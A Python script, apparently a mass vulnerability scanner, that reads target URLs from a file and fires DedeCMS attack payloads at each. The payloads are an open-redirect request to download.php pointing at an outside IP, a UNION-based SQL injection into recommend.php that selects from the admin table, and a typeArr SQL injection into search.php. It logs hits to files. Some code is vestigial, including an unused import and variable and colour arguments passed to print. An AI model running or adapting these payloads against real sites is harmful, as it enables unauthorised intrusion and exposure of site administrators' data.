import json
import requests


urls = open('url.txt')

poc = '/index.php/api/Uploadify/preview'


#重定向
for i in urls:
    url = i.rstrip("\n")
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plus/download.php?open=1&link=aHR0cDovLzQ1Ljc2LjE1OC45MS9zc3Jm"
        vulnurl = url + payload
        print(vulnurl)
        req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"100e8a82eea1ef8416e585433fd8462e" in req.text:
            print("[+]存在dedecms download.php重定向漏洞...(低危)\tpayload: " + vulnurl, "blue")
            with open('重定向.txt','a') as f:
                f.write(str(vulnurl))

        else:
            print("[-]不存在dedecms_download_redirect漏洞", "white", "on_grey")
    except:
        pass
        # recommend.php SQL注入漏洞
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27AnD+ChAr(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(1234),5,6,7,8,9%20FrOm%20`%23@__admin`%23"
        vulnurl = url + payload
        print(vulnurl)
        req2 = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in req2.text:
            print("[+]存在dedecms recommend.php SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('recommend.txt', 'a') as f:
                f.write(str(vulnurl))
        else:
            print("[-]不存在dedecms_recommend_sqli漏洞", "white", "on_grey")
    except:
        pass

        #search.php SQL注入漏洞
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plus/search.php?keyword=test&typeArr[%20uNion%20]=a"
        vulnurl = url + payload

        print(vulnurl)
        req3 = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
        if r"Error infos" in req3.text and r"Error sql" in req3.text:
            print("[+]存在dedecms search.php SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('search.txt', 'a') as f:
                f.write(str(vulnurl))
        else:
            print("[-]不存在dedecms_search_typeArr_sqli漏洞", "white", "on_grey")

    except:
        pass

